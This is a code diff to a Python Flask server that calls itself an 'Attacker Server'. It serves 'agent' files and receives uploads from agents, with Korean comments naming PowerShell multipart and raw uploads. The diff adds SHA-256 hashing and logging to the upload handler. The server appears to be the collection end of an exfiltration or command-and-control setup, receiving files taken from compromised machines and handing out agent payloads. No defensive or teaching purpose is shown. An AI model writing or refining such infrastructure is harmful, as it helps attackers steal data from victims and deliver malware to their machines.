@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, send_file
 import os, datetime
 from werkzeug.utils import secure_filename
+import hashlib
 
 app = Flask(__name__)
 
@@ -9,10 +10,18 @@ AGENT_DIR = os.path.join(BASE_DIR, "agents")
 LOG_FILE = os.path.join(BASE_DIR, "logs/access.log")
 UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
 
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+
 def log_event(text):
     with open(LOG_FILE, "a") as f:
         f.write(f"[{datetime.datetime.now()}] {text}\n")
-        
+
+def sha256sum(data: bytes):
+    h = hashlib.sha256()
+    h.update(data)
+    return h.hexdigest()
+
 @app.route("/")
 def home():
     return "Attacker Server Running"
@@ -46,39 +55,68 @@ def serve_agent(filename):
 
 @app.route("/upload", methods=["POST"])
 def upload_file():
+    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     agent_id = request.form.get("agent_id", "unknown")
     note     = request.form.get("note", "")
 
-    # --- CASE 1: multipart/form-data (PowerShell -Form 방식) ---
+    # =========================================================
+    # CASE 1: multipart/form-data (PowerShell -Form 방식)
+    # =========================================================
     if "file" in request.files:
         f = request.files["file"]
         if f.filename == "":
             return "Empty filename", 400
 
-        original_name = secure_filename(f.filename)
-        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        save_name = f"{ts}_{agent_id}_{original_name}"
+        original = secure_filename(f.filename)
+        data = f.read()
+
+        sha = sha256sum(data)
+        save_name = f"{ts}_{agent_id}_{original}"
         save_path = os.path.join(UPLOAD_DIR, save_name)
 
-        f.save(save_path)
-        log_event(f"[MULTIPART] UPLOAD: agent={agent_id}, file={save_name}, note={note}")
+        with open(save_path, "wb") as out:
+            out.write(data)
 
-        return jsonify({"status": "ok", "saved_as": save_name})
+        log_event(
+            f"[MULTIPART] agent={agent_id} file={save_name} "
+            f"sha256={sha} note={note}"
+        )
 
-    # --- CASE 2: raw binary upload (PowerShell -InFile 방식) ---
-    if request.data:
-        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        # raw 업로드는 파일명이 없으므로 임시 이름 자동 생성
+        return jsonify({
+            "status": "ok",
+            "mode": "multipart",
+            "saved_as": save_name,
+            "sha256": sha
+        })
+
+    # =========================================================
+    # CASE 2: raw binary upload (PowerShell -InFile 방식)
+    # =========================================================
+    raw = request.get_data()
+    if raw and len(raw) > 0:
+        sha = sha256sum(raw)
         save_name = f"{ts}_{agent_id}_raw_upload.bin"
         save_path = os.path.join(UPLOAD_DIR, save_name)
 
-        with open(save_path, "wb") as f:
-            f.write(request.data)
+        with open(save_path, "wb") as out:
+            out.write(raw)
 
-        log_event(f"[RAW] UPLOAD: agent={agent_id}, file={save_name}, note={note}")
+        log_event(
+            f"[RAW] agent={agent_id} file={save_name} "
+            f"sha256={sha} note={note}"
+        )
 
-        return jsonify({"status": "ok", "saved_as": save_name})
+        return jsonify({
+            "status": "ok",
+            "mode": "raw",
+            "saved_as": save_name,
+            "sha256": sha
+        })
 
+    # =========================================================
+    # FAIL
+    # =========================================================
+    log_event("[UPLOAD FAIL] No file received")
     return "No file received", 400
 
 
